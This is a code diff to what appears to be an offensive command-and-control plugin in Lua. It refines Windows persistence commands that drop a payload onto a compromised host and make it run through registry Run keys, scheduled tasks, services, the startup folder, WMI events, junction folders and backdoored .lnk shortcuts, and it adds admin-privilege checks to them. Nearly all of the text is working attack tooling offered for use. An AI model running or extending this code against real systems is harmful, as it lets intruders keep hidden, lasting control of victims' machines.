@@ -45,12 +45,12 @@ local function resolve_custom_file(cmd, session)
     end
 end
 
--- Add common custom file flags to a command
-local function add_custom_file_flags(cmd)
-    cmd:Flags():String("artifact_name", "", "artifact name to use as payload (tab-complete supported)")
-    cmd:Flags():String("custom_file", "", "local file path to use as payload")
-    cmd:Flags():Bool("use_malefic_as_custom_file", false, "use current session's artifact as payload")
-    bind_flags_completer(cmd, { artifact_name = artifact_name_completer() })
+local function requires_admin_for_registry_hive(hive)
+    local normalized = string.upper(hive or "")
+    return normalized == "HKLM" or normalized == "HKEY_LOCAL_MACHINE" or
+               normalized == "HKCR" or normalized == "HKEY_CLASSES_ROOT" or
+               normalized == "HKU" or normalized == "HKEY_USERS" or
+               normalized == "HKCC" or normalized == "HKEY_CURRENT_CONFIG"
 end
 
 local function run_Registry_Key(cmd, args)
@@ -65,6 +65,22 @@ local function run_Registry_Key(cmd, args)
         regkeyname = reg_key_name
     else
         regkeyname = persistdefaults.regkeyname
+    end
+
+    local hive, path
+    if registry_key ~= "" then
+        local parts = strings.split(registry_key,"\\")
+        hive = parts[1]
+        local path_parts = {}
+        for i = 2, #parts do
+            table.insert(path_parts, parts[i])
+        end
+        path = table.concat(path_parts, "\\")
+    end
+
+    if requires_admin_for_registry_hive(hive) and not isadmin(session) then
+        error("You need to be an admin to run this command")
+        return
     end
 
     if drop_location == "" then drop_location = persistdefaults.droplocation end
@@ -84,24 +100,13 @@ local function run_Registry_Key(cmd, args)
         uploadraw(session, custom_file_content, drop_location, "0644", false)
     end
 
-    local hive, path
-    if registry_key ~= "" then
-        local parts = strings.split(registry_key,"\\")
-        hive = parts[1]
-        local path_parts = {}
-        for i = 2, #parts do
-            table.insert(path_parts, parts[i])
-        end
-        path = table.concat(path_parts, "\\")
-    end
-
     return reg_add(session, hive, path, regkeyname, "REG_SZ", command)
 end
 
 local cmd_registry_key = command("persistence:Registry_Key", run_Registry_Key,
                                  "persistence via Windows Registry Key",
                                  "T1547.001")
-cmd_registry_key:Flags():String("reg_key_name", persistdefaults.registry_key,
+cmd_registry_key:Flags():String("reg_key_name", persistdefaults.regkeyname,
                                 "Name of the registry key to create or modify")
 cmd_registry_key:Flags():String("command", "",
                                 "Command to execute via the registry key")
@@ -109,7 +114,14 @@ cmd_registry_key:Flags():String("drop_location", persistdefaults.droplocation,
                                 "File path where payload is dropped")
 cmd_registry_key:Flags():String("registry_key", persistdefaults.registry_key,
                                 "Full registry key path (e.g., HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run)")
-add_custom_file_flags(cmd_registry_key)
+cmd_registry_key:Flags():String("artifact_name", "",
+                                "artifact name to use as payload (tab-complete supported)")
+cmd_registry_key:Flags():String("custom_file", "",
+                                "local file path to use as payload")
+cmd_registry_key:Flags():Bool("use_malefic_as_custom_file", false,
+                              "use current session's artifact as payload")
+bind_flags_completer(cmd_registry_key,
+                     { artifact_name = artifact_name_completer() })
 -- cmd_registry_key:Flags():Bool("clean_up", false, "clean_up")
 
 function run_scheduled_task(cmd, args)
@@ -152,7 +164,14 @@ cmd_scheduled_task:Flags():String("command", persistdefaults.command,
 cmd_scheduled_task:Flags():Int("trigger", 9, "trigger")
 cmd_scheduled_task:Flags():String("drop_location", persistdefaults.droplocation,
                                   "File path where payload is dropped")
-add_custom_file_flags(cmd_scheduled_task)
+cmd_scheduled_task:Flags():String("artifact_name", "",
+                                  "artifact name to use as payload (tab-complete supported)")
+cmd_scheduled_task:Flags():String("custom_file", "",
+                                  "local file path to use as payload")
+cmd_scheduled_task:Flags():Bool("use_malefic_as_custom_file", false,
+                                "use current session's artifact as payload")
+bind_flags_completer(cmd_scheduled_task,
+                     { artifact_name = artifact_name_completer() })
 
 local function run_service_install(cmd, args)
     local session = active()
@@ -162,6 +181,11 @@ local function run_service_install(cmd, args)
     local start_type = cmd:Flags():GetString("start_type")
     local error_control = cmd:Flags():GetString("error_control")
     local account_name = cmd:Flags():GetString("account_name")
+
+    if not isadmin(session) then
+        error("You need to be an admin to run this command")
+        return
+    end
 
     service_name = service_name ~= "" and service_name or
                        persistdefaults.servicename
@@ -197,7 +221,14 @@ cmd_service_install:Flags():String("account_name", "LocalSystem",
 cmd_service_install:Flags():String("drop_location",
                                    persistdefaults.droplocation,
                                    "File path where payload is dropped")
-add_custom_file_flags(cmd_service_install)
+cmd_service_install:Flags():String("artifact_name", "",
+                                   "artifact name to use as payload (tab-complete supported)")
+cmd_service_install:Flags():String("custom_file", "",
+                                   "local file path to use as payload")
+cmd_service_install:Flags():Bool("use_malefic_as_custom_file", false,
+                                 "use current session's artifact as payload")
+bind_flags_completer(cmd_service_install,
+                     { artifact_name = artifact_name_completer() })
 cmd_service_install:Flags():String("command", persistdefaults.command,
                                    "Command to execute via the registry key")
 
@@ -219,6 +250,11 @@ local function run_startup_folder(cmd, args)
                 filename
     end
 
+    if not use_current_user and not isadmin(session) then
+        error("You need to be an admin to run this command")
+        return
+    end
+
     local custom_file_content = resolve_custom_file(cmd, session)
     if custom_file_content == nil then return end
 
@@ -234,7 +270,14 @@ cmd_startup_folder:Flags():Bool("use_current_user_startupfolder", true,
                                 "use_current_user_startupfolder")
 cmd_startup_folder:Flags():String("filename", "Stay.exe",
                                   "filename of executable file to be run at startup.")
-add_custom_file_flags(cmd_startup_folder)
+cmd_startup_folder:Flags():String("artifact_name", "",
+                                  "artifact name to use as payload (tab-complete supported)")
+cmd_startup_folder:Flags():String("custom_file", "",
+                                  "local file path to use as payload")
+cmd_startup_folder:Flags():Bool("use_malefic_as_custom_file", false,
+                                "use current session's artifact as payload")
+bind_flags_completer(cmd_startup_folder,
+                     { artifact_name = artifact_name_completer() })
 
 local function run_wmi_event(cmd, args)
     local session = active()
@@ -242,6 +285,11 @@ local function run_wmi_event(cmd, args)
     local command = cmd:Flags():GetString("command")
     local attime = cmd:Flags():GetString("attime")
     local drop_location = cmd:Flags():GetString("drop_location")
+
+    if not isadmin(session) then
+        error("You need to be an admin to run this command")
+        return
+    end
 
     eventname = eventname ~= "" and eventname or persistdefaults.eventname
 
@@ -280,13 +328,25 @@ cmd_wmi_event:Flags():String("command", "", "Command to execute")
 cmd_wmi_event:Flags():String("attime", "startup", "At Time: ")
 cmd_wmi_event:Flags():String("drop_location", persistdefaults.droplocation,
                              "File path where payload is dropped")
-add_custom_file_flags(cmd_wmi_event)
+cmd_wmi_event:Flags():String("artifact_name", "",
+                             "artifact name to use as payload (tab-complete supported)")
+cmd_wmi_event:Flags():String("custom_file", "",
+                             "local file path to use as payload")
+cmd_wmi_event:Flags():Bool("use_malefic_as_custom_file", false,
+                           "use current session's artifact as payload")
+bind_flags_completer(cmd_wmi_event,
+                     { artifact_name = artifact_name_completer() })
 
 local function run_JunctionFolder(cmd, args)
     local session = active()
     local dllpath = cmd:Flags():GetString("dllpath")
     local guid = cmd:Flags():GetString("guid")
     local drop_location = cmd:Flags():GetString("drop_location")
+
+    if not isadmin(session) then
+        error("You need to be an admin to run this command")
+        return
+    end
 
     dllpath = dllpath ~= "" and dllpath or "C:\\windows\\system32\\ntdll.dll"
     guid = guid ~= "" and guid or "8d1c5b23-6907-4d3d-9da2-920b54d0753c"
@@ -314,7 +374,14 @@ local cmd_junction_folder = command("persistence:Junction_Folder",
 cmd_junction_folder:Flags():String("dllpath", "", "dllpath")
 cmd_junction_folder:Flags():String("guid", "", "guid")
 cmd_junction_folder:Flags():String("drop_location", "", "drop_location")
-add_custom_file_flags(cmd_junction_folder)
+cmd_junction_folder:Flags():String("artifact_name", "",
+                                   "artifact name to use as payload (tab-complete supported)")
+cmd_junction_folder:Flags():String("custom_file", "",
+                                   "local file path to use as payload")
+cmd_junction_folder:Flags():Bool("use_malefic_as_custom_file", false,
+                                 "use current session's artifact as payload")
+bind_flags_completer(cmd_junction_folder,
+                     { artifact_name = artifact_name_completer() })
 
 local function run_newlnk(cmd, args)
     local session = active()
@@ -362,7 +429,13 @@ cmd_newlnk:Flags():String("lnktarget", "", "lnktarget")
 cmd_newlnk:Flags():String("lnkicon", "", "lnkicon")
 cmd_newlnk:Flags():String("command", "", "command")
 cmd_newlnk:Flags():String("drop_location", "", "drop_location")
-add_custom_file_flags(cmd_newlnk)
+cmd_newlnk:Flags():String("artifact_name", "",
+                          "artifact name to use as payload (tab-complete supported)")
+cmd_newlnk:Flags():String("custom_file", "",
+                          "local file path to use as payload")
+cmd_newlnk:Flags():Bool("use_malefic_as_custom_file", false,
+                        "use current session's artifact as payload")
+bind_flags_completer(cmd_newlnk, { artifact_name = artifact_name_completer() })
 
 local function run_backdoorlnk(cmd, args)
     local session = active()
@@ -409,7 +482,14 @@ cmd_backdoorlnk:Flags():String("command", "",
                                "The new command to be set for the .lnk file.")
 cmd_backdoorlnk:Flags():String("drop_location", "",
                                "File path where payload is dropped")
-add_custom_file_flags(cmd_backdoorlnk)
+cmd_backdoorlnk:Flags():String("artifact_name", "",
+                               "artifact name to use as payload (tab-complete supported)")
+cmd_backdoorlnk:Flags():String("custom_file", "",
+                               "local file path to use as payload")
+cmd_backdoorlnk:Flags():Bool("use_malefic_as_custom_file", false,
+                             "use current session's artifact as payload")
+bind_flags_completer(cmd_backdoorlnk,
+                     { artifact_name = artifact_name_completer() })
 
 -- registry_key
 local function run_regkey_autorun(cmd)
